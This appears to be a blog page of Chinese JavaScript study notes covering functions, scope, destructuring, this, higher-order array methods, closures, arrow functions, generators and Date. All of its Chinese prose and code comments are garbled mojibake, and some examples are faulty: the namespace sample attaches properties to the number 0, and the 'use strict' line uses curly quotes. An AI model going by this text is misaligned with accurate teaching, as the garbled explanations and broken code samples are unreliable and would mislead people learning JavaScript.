<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;forEachå‡½æ•°åŒæ ·å¯ä»¥ç”¨æ¥éå†</span><br><span class="line">var a &#x3D; [&#39;A&#39;,&#39;B&#39;,&#39;C&#39;];</span><br><span class="line">a.forEach(function(value,index,a)&#123;</span><br><span class="line">	console.log(value+&#39;,&#39;+index);</span><br><span class="line">&#125;);</span><br><span class="line">&#x2F;&#x2F;A,0  B,1  C,2</span><br><span class="line">forEach(å€¼,é”®,è‡ªèº«)</span><br></pre></td></tr></table></figure>
<h1 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h1><h2 id="å‡½æ•°å®šä¹‰å’Œè°ƒç”¨"><a href="#å‡½æ•°å®šä¹‰å’Œè°ƒç”¨" class="headerlink" title="å‡½æ•°å®šä¹‰å’Œè°ƒç”¨"></a>å‡½æ•°å®šä¹‰å’Œè°ƒç”¨</h2><p><strong>å®šä¹‰å‡½æ•°</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">abs</span>(<span class="params">...</span>)</span>&#123;</span><br><span class="line">	...</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//function æŒ‡æ˜æ˜¯å‡½æ•°çš„å®šä¹‰</span></span><br><span class="line"><span class="comment">//absæ˜¯å‡½æ•°åç§°</span></span><br><span class="line"><span class="comment">//(...)é‡Œé¢æ˜¯å‚æ•°</span></span><br><span class="line"><span class="comment">//&#123;...&#125;æ˜¯å‡½æ•°ä½“</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å¦ä¸€ç§å®šä¹‰æ–¹æ³•</span></span><br><span class="line"><span class="keyword">var</span> abs = <span class="function"><span class="keyword">function</span>(<span class="params">..</span>)</span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//åœ¨è¿™ç§æ–¹å¼ä¸‹ï¼Œfunction(x)&#123; ... &#125;æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå®ƒæ²¡æœ‰å‡½æ•°åã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªåŒ¿åå‡½æ•°èµ‹å€¼ç»™äº†å˜é‡absï¼Œæ‰€ä»¥ï¼Œé€šè¿‡å˜é‡abså°±å¯ä»¥è°ƒç”¨è¯¥å‡½æ•°ã€‚</span></span><br></pre></td></tr></table></figure>
<p>è¯·æ³¨æ„ï¼Œå‡½æ•°ä½“å†…éƒ¨çš„è¯­å¥åœ¨æ‰§è¡Œæ—¶ï¼Œä¸€æ—¦æ‰§è¡Œåˆ°<code>return</code>æ—¶ï¼Œå‡½æ•°å°±æ‰§è¡Œå®Œæ¯•ï¼Œå¹¶å°†ç»“æœè¿”å›ã€‚å› æ­¤ï¼Œå‡½æ•°å†…éƒ¨é€šè¿‡æ¡ä»¶åˆ¤æ–­å’Œå¾ªç¯å¯ä»¥å®ç°éå¸¸å¤æ‚çš„é€»è¾‘ã€‚</p>
<p>å¦‚æœæ²¡æœ‰<code>return</code>è¯­å¥ï¼Œå‡½æ•°æ‰§è¡Œå®Œæ¯•åä¹Ÿä¼šè¿”å›ç»“æœï¼Œåªæ˜¯ç»“æœä¸º<code>undefined</code>ã€‚</p>
<hr>
<p><strong>è°ƒç”¨å‡½æ•°</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abs(10);</span><br><span class="line">abs(10,111);  &#x2F;&#x2F;è¿”å›10</span><br><span class="line">abs();     &#x2F;&#x2F;è¿”å›NaN</span><br></pre></td></tr></table></figure>
<p>ç”±äºJavaScriptå…è®¸ä¼ å…¥ä»»æ„ä¸ªå‚æ•°è€Œä¸å½±å“è°ƒç”¨ï¼Œå› æ­¤ä¼ å…¥çš„å‚æ•°æ¯”å®šä¹‰çš„å‚æ•°å¤šä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚</p>
<hr>
<p><strong>arguments</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//arguments(ä¼ªæ•°ç»„)</span></span><br><span class="line"><span class="comment">//å­˜å‚¨äº†ç”¨æˆ·çš„æ‰€æœ‰å®å‚</span></span><br><span class="line"><span class="comment">//ä¼ªæ•°ç»„ æœ‰lengthå±æ€§ æ˜¯æŒ‰ç…§ç´¢å¼•å­˜å‚¨çš„</span></span><br><span class="line">fn(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)  <span class="comment">//argumentsçš„æ•°ç»„å°±æ˜¯1 2 3</span></span><br></pre></td></tr></table></figure>
<p>å®é™…ä¸Š<code>arguments</code>æœ€å¸¸ç”¨äºåˆ¤æ–­ä¼ å…¥å‚æ•°çš„ä¸ªæ•°,ä»¥æ­¤æ¥åˆ¤æ–­ç¼ºå¤±å‚æ•°ã€‚</p>
<hr>
<p><strong>rest</strong></p>
<p>ç”±äºjsä¸­ä¼šæ¥å—æ¥å—å¤šä½™çš„å‚æ•°ï¼Œæ‰€ä»¥ç”¨ä¸€ä¸ªrestæ•°ç»„æ¥è¡¨ç¤ºå¤šä½™çš„å‚æ•°ã€‚restå‚æ•°åªèƒ½å†™åœ¨æœ€åï¼Œå‰é¢ç”¨<code>...</code>æ ‡è¯†ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">a,b,...rest</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(rest);</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line">fn(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);  <span class="comment">//[3]</span></span><br><span class="line">fn(<span class="number">1</span>,<span class="number">2</span>)     <span class="comment">//[]</span></span><br></pre></td></tr></table></figure>
<h2 id="å˜é‡ä½œç”¨åŸŸä¸è§£æ„èµ‹å€¼"><a href="#å˜é‡ä½œç”¨åŸŸä¸è§£æ„èµ‹å€¼" class="headerlink" title="å˜é‡ä½œç”¨åŸŸä¸è§£æ„èµ‹å€¼"></a>å˜é‡ä½œç”¨åŸŸä¸è§£æ„èµ‹å€¼</h2><p>å¦‚æœä¸€ä¸ªå˜é‡åœ¨å‡½æ•°ä½“å†…éƒ¨ç”³æ˜ï¼Œåˆ™è¯¥å˜é‡çš„ä½œç”¨åŸŸä¸ºæ•´ä¸ªå‡½æ•°ä½“ï¼Œåœ¨å‡½æ•°ä½“å¤–ä¸å¯å¼•ç”¨è¯¥å˜é‡ã€‚</p>
<p>å¦‚æœä¸¤ä¸ªä¸åŒçš„å‡½æ•°å„è‡ªç”³æ˜äº†åŒä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆè¯¥å˜é‡åªåœ¨å„è‡ªçš„å‡½æ•°ä½“å†…èµ·ä½œç”¨ã€‚æ¢å¥è¯è¯´ï¼Œä¸åŒå‡½æ•°å†…éƒ¨çš„åŒåå˜é‡äº’ç›¸ç‹¬ç«‹ï¼Œäº’ä¸å½±å“ã€‚</p>
<hr>
<p><strong>å…¨å±€ä½œç”¨åŸŸ</strong></p>
<p>ä¸åœ¨ä»»ä½•å‡½æ•°å†…å®šä¹‰çš„å˜é‡å°±å…·æœ‰å…¨å±€ä½œç”¨åŸŸã€‚å®é™…ä¸Šï¼ŒJavaScripté»˜è®¤æœ‰ä¸€ä¸ªå…¨å±€å¯¹è±¡<code>window</code>ï¼Œå…¨å±€ä½œç”¨åŸŸçš„å˜é‡å®é™…ä¸Šè¢«ç»‘å®šåˆ°<code>window</code>çš„ä¸€ä¸ªå±æ€§ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="string">'A'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.a);</span><br></pre></td></tr></table></figure>
<p>åŒæ ·çš„ï¼Œå‡½æ•°ä¹Ÿæ˜¯ä¸€ä¸ªå˜é‡ï¼Œä¹Ÿä¼šç»‘å®šåˆ°<code>windows</code>å¯¹è±¡ã€‚ä»»ä½•å˜é‡ï¼ˆå‡½æ•°ä¹Ÿè§†ä¸ºå˜é‡ï¼‰ï¼Œå¦‚æœæ²¡æœ‰åœ¨å½“å‰å‡½æ•°ä½œç”¨åŸŸä¸­æ‰¾åˆ°ï¼Œå°±ä¼šç»§ç»­å¾€ä¸ŠæŸ¥æ‰¾ï¼Œæœ€åå¦‚æœåœ¨å…¨å±€ä½œç”¨åŸŸä¸­ä¹Ÿæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™æŠ¥<code>ReferenceError</code>é”™è¯¯ã€‚</p>
<hr>
<p><strong>åå­—ç©ºé—´</strong></p>
<p>å…¨å±€å˜é‡ä¼šç»‘å®šåˆ°<code>window</code>ä¸Šï¼Œä¸åŒçš„JavaScriptæ–‡ä»¶å¦‚æœä½¿ç”¨äº†ç›¸åŒçš„å…¨å±€å˜é‡ï¼Œæˆ–è€…å®šä¹‰äº†ç›¸åŒåå­—çš„é¡¶å±‚å‡½æ•°ï¼Œéƒ½ä¼šé€ æˆå‘½åå†²çªï¼Œå¹¶ä¸”å¾ˆéš¾è¢«å‘ç°ã€‚<strong>å‡å°‘å†²çªçš„ä¸€ä¸ªæ–¹æ³•æ˜¯æŠŠè‡ªå·±çš„æ‰€æœ‰å˜é‡å’Œå‡½æ•°å…¨éƒ¨ç»‘å®šåˆ°ä¸€ä¸ªå…¨å±€å˜é‡ä¸­ã€‚</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Ma = <span class="number">0</span>;</span><br><span class="line">Ma.name = <span class="string">"xiaoming"</span>;</span><br><span class="line">Ma.fn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> ....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>å±€éƒ¨ä½œç”¨åŸŸ</strong></p>
<p>ä¸ºäº†è§£å†³å—çº§ä½œç”¨åŸŸï¼ŒES6å¼•å…¥äº†æ–°çš„å…³é”®å­—<code>let</code>ï¼Œç”¨<code>let</code>æ›¿ä»£<code>var</code>å¯ä»¥ç”³æ˜ä¸€ä¸ªå—çº§ä½œç”¨åŸŸçš„å˜é‡ã€‚</p>
<p><strong>å¸¸é‡</strong></p>
<p>ES6æ ‡å‡†å¼•å…¥äº†æ–°çš„å…³é”®å­—<code>const</code>æ¥å®šä¹‰å¸¸é‡ï¼Œ<code>const</code>ä¸<code>let</code>éƒ½å…·æœ‰å—çº§ä½œç”¨åŸŸã€‚</p>
<p><strong>è§£æ„èµ‹å€¼</strong></p>
<p>è§£æ„èµ‹å€¼å°±æ˜¯åŒæ—¶å¯¹ä¸€ç»„å˜é‡è¿›è¡Œèµ‹å€¼ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> [x, y, z] = [<span class="string">'hello'</span>, <span class="string">'JavaScript'</span>, <span class="string">'ES6'</span>];</span><br><span class="line"><span class="built_in">console</span>.log(x);</span><br></pre></td></tr></table></figure>
<p>å¦‚æœéœ€è¦ä»ä¸€ä¸ªå¯¹è±¡ä¸­å–å‡ºè‹¥å¹²å±æ€§ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è§£æ„èµ‹å€¼ï¼Œä¾¿äºå¿«é€Ÿè·å–å¯¹è±¡çš„æŒ‡å®šå±æ€§ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    name : <span class="string">'xiaoming'</span>,</span><br><span class="line">		age : <span class="number">18</span>,</span><br><span class="line">		university : &#123;</span><br><span class="line">				specialities : <span class="string">'cs'</span></span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//ç›´æ¥èµ‹å€¼</span></span><br><span class="line"><span class="keyword">var</span> &#123;name,age&#125; = person;</span><br><span class="line"><span class="comment">//åµŒå¥—å¯¹è±¡çš„èµ‹å€¼</span></span><br><span class="line"><span class="keyword">var</span> &#123;<span class="attr">university</span> : &#123;specialities&#125;&#125; = person;</span><br><span class="line"><span class="comment">//å¦‚æœæƒ³è¦çš„å˜é‡å’Œå¯¹è±¡çš„å±æ€§åä¸ä¸€æ ·ï¼Œå¯ä»¥å¦‚ä¸‹æ“ä½œ</span></span><br><span class="line"><span class="keyword">var</span> &#123;<span class="attr">name</span>:mz&#125; = person;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ä½¿ç”¨åœºæ™¯ï¼šè§£æ„èµ‹å€¼åœ¨å¾ˆå¤šæ—¶å€™å¯ä»¥å¤§å¤§ç®€åŒ–ä»£ç ã€‚ä¾‹å¦‚ï¼Œäº¤æ¢ä¸¤ä¸ªå˜é‡<code>x</code>å’Œ<code>y</code>çš„å€¼ï¼Œå¯ä»¥è¿™ä¹ˆå†™ï¼Œä¸å†éœ€è¦ä¸´æ—¶å˜é‡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 1,y &#x3D; 2;</span><br><span class="line">[x , y] &#x3D; [y ,x];</span><br></pre></td></tr></table></figure>
<p>å¦‚æœä¸€ä¸ªå‡½æ•°æ¥æ”¶ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œé‚£ä¹ˆï¼Œå¯ä»¥ä½¿ç”¨è§£æ„ç›´æ¥æŠŠå¯¹è±¡çš„å±æ€§ç»‘å®šåˆ°å˜é‡ä¸­ã€‚</p>
</blockquote>
<h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>åœ¨ä¸€ä¸ªå¯¹è±¡ä¸­ç»‘å®šå‡½æ•°ï¼Œç§°ä¸ºè¿™ä¸ªå¯¹è±¡çš„æ–¹æ³•ã€‚</p>
<p>åœ¨ä¸€ä¸ªæ–¹æ³•å†…éƒ¨ï¼Œ<code>this</code>æ˜¯ä¸€ä¸ªç‰¹æ®Šå˜é‡ï¼Œå®ƒå§‹ç»ˆæŒ‡å‘å½“å‰å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯<code>xiaoming</code>è¿™ä¸ªå˜é‡ã€‚æ‰€ä»¥ï¼Œ<code>this.birth</code>å¯ä»¥æ‹¿åˆ°<code>xiaoming</code>çš„<code>birth</code>å±æ€§ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAge</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> y = <span class="keyword">new</span> <span class="built_in">Date</span>().getFullYear();</span><br><span class="line">    <span class="keyword">return</span> y - <span class="keyword">this</span>.birth;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    name: <span class="string">'å°æ˜'</span>,</span><br><span class="line">    birth: <span class="number">1990</span>,</span><br><span class="line">    age: getAge</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xiaoming.age(); <span class="comment">// 30, æ­£å¸¸ç»“æœ</span></span><br><span class="line">getAge(); <span class="comment">// NaN</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœä»¥å¯¹è±¡çš„æ–¹æ³•å½¢å¼è°ƒç”¨ï¼Œæ¯”å¦‚<code>xiaoming.age()</code>ï¼Œè¯¥å‡½æ•°çš„<code>this</code>æŒ‡å‘è¢«è°ƒç”¨çš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯<code>xiaoming</code>ï¼Œè¿™æ˜¯ç¬¦åˆæˆ‘ä»¬é¢„æœŸçš„ã€‚</p>
<p>å¦‚æœå•ç‹¬è°ƒç”¨å‡½æ•°ï¼Œæ¯”å¦‚<code>getAge()</code>ï¼Œæ­¤æ—¶ï¼Œè¯¥å‡½æ•°çš„<code>this</code>æŒ‡å‘å…¨å±€å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯<code>window</code>ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">â€˜use strictâ€™;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">	name : <span class="string">'xiaoming'</span>,</span><br><span class="line">	age : <span class="number">18</span>,</span><br><span class="line">	math : <span class="number">90</span>,</span><br><span class="line">	en : <span class="number">99</span>,</span><br><span class="line">	grades : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">var</span> that = <span class="keyword">this</span>;  <span class="comment">//æ•æ‰thisæŒ‡é’ˆ</span></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">getGrades</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//è¿›è¡Œé‡æ„</span></span><br><span class="line">		<span class="keyword">return</span> that.math+that.en;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> getGrades();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="é«˜é˜¶å‡½æ•°"><a href="#é«˜é˜¶å‡½æ•°" class="headerlink" title="é«˜é˜¶å‡½æ•°"></a>é«˜é˜¶å‡½æ•°</h2><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>ç”±äº<code>map()</code>æ–¹æ³•å®šä¹‰åœ¨JavaScriptçš„<code>Array</code>ä¸­ï¼Œæˆ‘ä»¬è°ƒç”¨<code>Array</code>çš„<code>map()</code>æ–¹æ³•ï¼Œä¼ å…¥æˆ‘ä»¬è‡ªå·±çš„å‡½æ•°ï¼Œå°±å¾—åˆ°äº†ä¸€ä¸ªæ–°çš„<code>Array</code>ä½œä¸ºç»“æœã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">arr.map(<span class="function"><span class="params">x</span>=&gt;</span>x*<span class="number">2</span>); <span class="comment">//[2,4,6]</span></span><br><span class="line">arr.map(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;<span class="keyword">return</span> x*<span class="number">2</span>;&#125;); <span class="comment">//[2,4,6]</span></span><br></pre></td></tr></table></figure>
<h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h3><p>rrayçš„<code>reduce()</code>æŠŠä¸€ä¸ªå‡½æ•°ä½œç”¨åœ¨è¿™ä¸ª<code>Array</code>çš„<code>[x1, x2, x3...]</code>ä¸Šï¼Œè¿™ä¸ªå‡½æ•°å¿…é¡»æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œ<code>reduce()</code>æŠŠç»“æœç»§ç»­å’Œåºåˆ—çš„ä¸‹ä¸€ä¸ªå…ƒç´ åšç´¯ç§¯è®¡ç®—ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [x1,x2,x3,x4];</span><br><span class="line">arr.reduce(<span class="function">(<span class="params">x,y</span>)=&gt;</span>(x+y)); <span class="comment">//x1+x2+x3+x4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>];</span><br><span class="line">arr.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x * <span class="number">10</span> + y;</span><br><span class="line">&#125;); <span class="comment">// 13579</span></span><br></pre></td></tr></table></figure>
<h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a><strong>filter</strong></h3><p>filterä¹Ÿæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„æ“ä½œï¼Œå®ƒç”¨äºæŠŠ<code>Array</code>çš„æŸäº›å…ƒç´ è¿‡æ»¤æ‰ï¼Œç„¶åè¿”å›å‰©ä¸‹çš„å…ƒç´ ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">var</span> r = arr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x%<span class="number">2</span> !=<span class="number">0</span>;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(r);</span><br></pre></td></tr></table></figure>
<h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><p>jsä¸­æ’åºç®—æ³•æ˜¯å…ˆæŠŠæ‰€æœ‰å…ƒç´ å…ˆè½¬æ¢ä¸ºStringå†æŒ‰ç…§asciiç æ’åºã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var arr &#x3D; [10,20,1,2];</span><br><span class="line">var r &#x3D; arr.sort(function(x,y)&#123;</span><br><span class="line">	if(x&lt;y)return 1;</span><br><span class="line">	else if(x&gt;y)return -1;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;)</span><br><span class="line">console.log(arr) &#x2F;&#x2F;[20,10,2,1]</span><br><span class="line">console.log(r)  &#x2F;&#x2F;[20,10,2,1]</span><br></pre></td></tr></table></figure>
<p><code>sort()</code>æ–¹æ³•ä¼šç›´æ¥å¯¹<code>Array</code>è¿›è¡Œä¿®æ”¹ï¼Œå®ƒè¿”å›çš„ç»“æœä»æ˜¯å½“å‰<code>Array</code>ã€‚</p>
<h2 id="é—­åŒ…"><a href="#é—­åŒ…" class="headerlink" title="é—­åŒ…"></a>é—­åŒ…</h2><p><strong>å‡½æ•°ä½œä¸ºè¿”å›å€¼</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lazy_sum</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> sum = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> arr.reduce(<span class="function"><span class="keyword">function</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> x + y;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> f = lazy_sum([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]);</span><br><span class="line">f;   <span class="comment">//fæ˜¯è¿”å›sumå‡½æ•°æœ¬èº«</span></span><br><span class="line">f();  <span class="comment">//f()æ‰æ˜¯è°ƒç”¨å‡½æ•°</span></span><br></pre></td></tr></table></figure>
<h2 id="ç®­å¤´å‡½æ•°"><a href="#ç®­å¤´å‡½æ•°" class="headerlink" title="ç®­å¤´å‡½æ•°"></a>ç®­å¤´å‡½æ•°</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ— &#123;&#125;çš„</span></span><br><span class="line">x =&gt; x*x</span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">x</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x*x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¿”å›å¤šæ¡</span></span><br><span class="line">x =&gt; &#123;</span><br><span class="line">	... return ;</span><br><span class="line">	... return ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¤šä¸ªå‚æ•°</span></span><br><span class="line">(x,y) =&gt; x*x+y*y</span><br><span class="line"><span class="comment">//è¿”å›å¯¹è±¡</span></span><br><span class="line">x =&gt; (&#123;<span class="attr">foo</span>:x&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="generator"><a href="#generator" class="headerlink" title="generator"></a>generator</h2><p>generatorç”±<code>function*</code>å®šä¹‰ï¼ˆæ³¨æ„å¤šå‡ºçš„<code>*</code>å·ï¼‰ï¼Œå¹¶ä¸”ï¼Œé™¤äº†<code>return</code>è¯­å¥ï¼Œè¿˜å¯ä»¥ç”¨<code>yield</code>è¿”å›å¤šæ¬¡ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function* foo(x)&#123;</span><br><span class="line">  yield x+1;</span><br><span class="line">  yield x+2;</span><br><span class="line">  return x+3;</span><br><span class="line">&#125;</span><br><span class="line">foo(2);</span><br></pre></td></tr></table></figure>
<p>è°ƒç”¨generatorå¯¹è±¡æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼Œ</p>
<ul>
<li><p>ä¸€æ˜¯ä¸æ–­åœ°è°ƒç”¨generatorå¯¹è±¡çš„<code>next()</code>æ–¹æ³•<code>next()</code>æ–¹æ³•ä¼šæ‰§è¡Œgeneratorçš„ä»£ç ï¼Œç„¶åï¼Œæ¯æ¬¡é‡åˆ°<code>yield x;</code>å°±è¿”å›ä¸€ä¸ªå¯¹è±¡<code>{value: x, done: true/false}</code>ï¼Œç„¶åâ€œæš‚åœâ€ã€‚è¿”å›çš„<code>value</code>å°±æ˜¯<code>yield</code>çš„è¿”å›å€¼ï¼Œ<code>done</code>è¡¨ç¤ºè¿™ä¸ªgeneratoræ˜¯å¦å·²ç»æ‰§è¡Œç»“æŸäº†ã€‚å¦‚æœ<code>done</code>ä¸º<code>true</code>ï¼Œåˆ™<code>value</code>å°±æ˜¯<code>return</code>çš„è¿”å›å€¼ã€‚</p>
</li>
<li><p>ç¬¬äºŒä¸ªæ–¹æ³•æ˜¯ç›´æ¥ç”¨<code>for ... of</code>å¾ªç¯è¿­ä»£generatorå¯¹è±¡ï¼Œè¿™ç§æ–¹å¼ä¸éœ€è¦æˆ‘ä»¬è‡ªå·±åˆ¤æ–­<code>done</code>ã€‚</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ç¬¬ä¸€ç§</span></span><br><span class="line"><span class="keyword">var</span> f = foo(<span class="number">2</span>);</span><br><span class="line">f.next()	<span class="comment">//&#123;value: 3, done: false&#125;</span></span><br><span class="line">f.next()	<span class="comment">//&#123;value: 4, done: false&#125;</span></span><br><span class="line">f.next()	<span class="comment">//&#123;value: 5, done: true&#125;</span></span><br><span class="line">f.next()	<span class="comment">//&#123;value: undefined, done: true&#125;</span></span><br><span class="line"><span class="comment">//ç¬¬äºŒç§</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> x <span class="keyword">of</span> foo(<span class="number">2</span>))&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;  <span class="comment">//3,4</span></span><br></pre></td></tr></table></figure>
<h1 id="æ ‡å‡†å¯¹è±¡"><a href="#æ ‡å‡†å¯¹è±¡" class="headerlink" title="æ ‡å‡†å¯¹è±¡"></a>æ ‡å‡†å¯¹è±¡</h1><ul>
<li>ä¸è¦ä½¿ç”¨<code>new Number()</code>ã€<code>new Boolean()</code>ã€<code>new String()</code>åˆ›å»ºåŒ…è£…å¯¹è±¡ï¼›</li>
<li>ç”¨<code>parseInt()</code>æˆ–<code>parseFloat()</code>æ¥è½¬æ¢ä»»æ„ç±»å‹åˆ°<code>number</code>ï¼›</li>
<li>ç”¨<code>String()</code>æ¥è½¬æ¢ä»»æ„ç±»å‹åˆ°<code>string</code>ï¼Œæˆ–è€…ç›´æ¥è°ƒç”¨æŸä¸ªå¯¹è±¡çš„<code>toString()</code>æ–¹æ³•ï¼›</li>
<li>é€šå¸¸ä¸å¿…æŠŠä»»æ„ç±»å‹è½¬æ¢ä¸º<code>boolean</code>å†åˆ¤æ–­ï¼Œå› ä¸ºå¯ä»¥ç›´æ¥å†™<code>if (myVar) {...}</code>ï¼›</li>
<li><code>typeof</code>æ“ä½œç¬¦å¯ä»¥åˆ¤æ–­å‡º<code>number</code>ã€<code>boolean</code>ã€<code>string</code>ã€<code>function</code>å’Œ<code>undefined</code>ï¼›</li>
<li>åˆ¤æ–­<code>Array</code>è¦ä½¿ç”¨<code>Array.isArray(arr)</code>ï¼›</li>
<li>åˆ¤æ–­<code>null</code>è¯·ä½¿ç”¨<code>myVar === null</code>ï¼›</li>
<li>åˆ¤æ–­æŸä¸ªå…¨å±€å˜é‡æ˜¯å¦å­˜åœ¨ç”¨<code>typeof window.myVar === &#39;undefined&#39;</code>ï¼›</li>
<li>å‡½æ•°å†…éƒ¨åˆ¤æ–­æŸä¸ªå˜é‡æ˜¯å¦å­˜åœ¨ç”¨<code>typeof myVar === &#39;undefined&#39;</code>ã€‚</li>
</ul>
<h2 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h2><p>åœ¨JavaScriptä¸­ï¼Œ<code>Date</code>å¯¹è±¡ç”¨æ¥è¡¨ç¤ºæ—¥æœŸå’Œæ—¶é—´ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var now &#x3D; new Date();</span><br><span class="line">now.getMilliseconds();  &#x2F;&#x2F;æ¯«ç§’æ•°</span><br><span class="line">now.getTime();  &#x2F;&#x2F;æ—¶é—´æˆ³</span><br><span class="line">var d &#x3D; new Date(2020,6,30,8,39,30,123)  &#x2F;&#x2F;è‡ªå®šä¹‰æ—¶é—´</span><br></pre></td></tr></table></figure>
